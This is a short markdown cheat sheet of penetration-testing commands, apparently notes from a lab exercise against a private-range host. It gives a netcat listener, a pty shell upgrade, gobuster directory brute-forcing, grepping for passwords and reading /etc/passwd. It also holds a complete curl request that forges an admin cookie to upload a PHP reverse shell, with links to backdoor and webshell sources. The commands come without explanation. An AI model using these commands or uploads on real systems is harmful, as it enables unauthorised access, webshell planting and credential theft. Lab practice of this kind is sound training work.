# snippets
---

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```
nc -lvnp 1234
```

```
gobuster dir --url https://{TARGET_IP}/ --wordlist
/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
```

```
 cat * | grep -i passw*
```

```
cat /etc/passwd
```

```
curl 'http://10.129.84.7/cdn-cgi/login/admin.php?content=uploads&action=upload' 
-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0' \ 
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' \ 
-H 'Accept-Language: en-US,en;q=0.5' --compressed \ 
-H 'Content-Type: multipart/form-data; boundary=---------------------------134685576120720054973338887215' \ 
-H 'Origin: http://10.129.84.7' \ 
-H 'DNT: 1' \ 
-H 'Connection: keep-alive' \ 
-H 'Referer: http://10.129.84.7/cdn-cgi/login/admin.php?content=uploads' \ 
-H 'Cookie: user=34322; role=admin' \ 
-H 'Upgrade-Insecure-Requests: 1' --data-binary \
$'-----------------------------134685576120720054973338887215\r\nContent-Disposition: form-data; \
name="name"\r\n\r\n444\r\n-----------------------------134685576120720054973338887215\r\nContent-Disposition: \
form-data; name="fileToUpload"; filename="php-reverse-shell.php"\r\nContent-Type: \
application/x-php\r\n\r\n-----------------------------134685576120720054973338887215--\r\n'
```

# Ref

* [Simple-Backdoor-One-Liner.php](https://gist.github.com/sente/4dbb2b7bdda2647ba80b "Simple-Backdoor-One-Liner.php")

* [webshells/php-reverse-shell.php at master · BlackArch/webshells](https://github.com/BlackArch/webshells/blob/master/php/php-reverse-shell.php "webshells/php-reverse-shell.php at master · BlackArch/webshells")
